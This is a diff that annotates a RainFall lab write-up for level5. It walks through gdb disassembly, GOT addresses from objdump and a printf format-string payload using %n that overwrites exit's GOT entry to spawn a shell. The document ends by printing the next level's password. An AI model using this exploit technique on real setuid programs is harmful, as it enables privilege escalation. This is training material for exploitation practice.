@@ -4,11 +4,18 @@ level5@RainFall:~$ ls -l
 total 8
 -rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
 level5@RainFall:~$ cat level5
-[H�F4p	$(,048<S��[�����������t�m�(�C�[��5�% �%$h������%(������%,h������%0h�����%4h �����%8h(�����%<h0����1�^����PTRh�h QVh��������������������U��S���=Lu?�P�D��@����9�s�����P��@�P9�r��L��[]Ít&��'U����H��t���t	�$H���ÐU����$������$����������������Ë$Ð���������U��S���8���t�8f����Ћ���u��[]Ð�S��[��C�?����[�/bin/sh;@x���\������������� ���)�����t)1��D$8�,$�D�D$4�D$��� �����9�u߃�[^_]��
+[H�F4p	$(,048<S��[�����������t�m�(�C�[��5�% �%$h������%(������%,h������%0h�����%4h �����%8h(�����%<h0����1�^����PTRh�h
+ QVh��������������������U��S���=Lu?�P�D��@����9�s�����P��@�P9�r��L��[]Ít&��'U����H��t���t	�$H���ÐU����$������$�������
+ ���������Ë$Ð���������U��S���8���t�8f����Ћ���u��[]Ð�S��[��C�?����[�/bin/sh;@x���\������������� ���)�����t)1��D$8�,$�D�D
+ $4�D$��� �����9�u߃�[^_]��
 
 level5@RainFall:~$ ./level5
 wer
 wer
+
+********************************************************************************
+The program has the same comportement as before, he rewrites what we input.
+********************************************************************************
 
 (gdb) info function
 All defined functions:
@@ -41,6 +48,10 @@ Non-debugging symbols:
 0x080485a0  __do_global_ctors_aux
 0x080485cc  _fini
 
+********************************************************************************
+We can see 3 functions main, o and n.
+********************************************************************************
+
 (gdb) info variable
 All defined variables:
 
@@ -66,6 +77,10 @@ Non-debugging symbols:
 0x08049850  dtor_idx.6161
 0x08049854  m
 
+********************************************************************************
+And a variable m at 0x08049854.
+********************************************************************************
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x08048504 <+0>:	push   %ebp
@@ -75,6 +90,10 @@ Dump of assembler code for function main:
    0x0804850f <+11>:	leave
    0x08048510 <+12>:	ret
 End of assembler dump.
+
+********************************************************************************
+Main call the function n.
+********************************************************************************
 
 (gdb) disas n
 Dump of assembler code for function n:
@@ -94,6 +113,10 @@ Dump of assembler code for function n:
    0x080484ff <+61>:	call   0x80483d0 <exit@plt>
 End of assembler dump.
 
+********************************************************************************
+Fgets is called with a lenght limit of 512 characters, print it and exit.
+********************************************************************************
+
 (gdb) disas o
 Dump of assembler code for function o:
    0x080484a4 <+0>:	push   %ebp
@@ -104,3 +127,50 @@ Dump of assembler code for function o:
    0x080484b6 <+18>:	movl   $0x1,(%esp)
    0x080484bd <+25>:	call   0x8048390 <_exit@plt>
 End of assembler dump.
+
+********************************************************************************
+The function o is never called but call system(/bin/sh) and then exit.
+We will try to call it by placing the address of o in the eip.
+To do that we will exploit printf and his %n to write directly in the address of 
+a pointer of a function called after printf, exit in our case.
+********************************************************************************
+
+level5@RainFall:~$ objdump -R level5
+
+level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+
+********************************************************************************
+We get the address of exit, he is at 08049838 sub 4 to get the address of it's beginning.
+08049838 we need to convert it in little endian \x38\x98\x04\x08.
+The start of o is at the address 0x080484a4 = 134513828 in decimal number.
+********************************************************************************
+
+level5@RainFall:~$ python -c 'print("AAAABBBBCCCC"+" %x "*6)' > /tmp/exploit
+level5@RainFall:~$ cat /tmp/exploit | ./level5
+AAAABBBBCCCC 200  b7fd1ac0  b7ff37d0  41414141  42424242  43434343
+
+********************************************************************************
+We can see that our buffer is at the fourth position on the stack AAAA == 41414141, so we will
+have to pop three elements out of the stack to have it taken into arguments by %n.
+134513828 - 4 (exit address) - 11 (%x%x = 200b7fd1ac0) = 134513813
+********************************************************************************
+
+python -c 'print("\x38\x98\x04\x08%x%x%134513813x%n")' > /tmp/exploit ; cat /tmp/exploit - | ./level5
+...
+                         b7ff37d0
+whoami
+level6
+cd ../level6 ; cat .pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
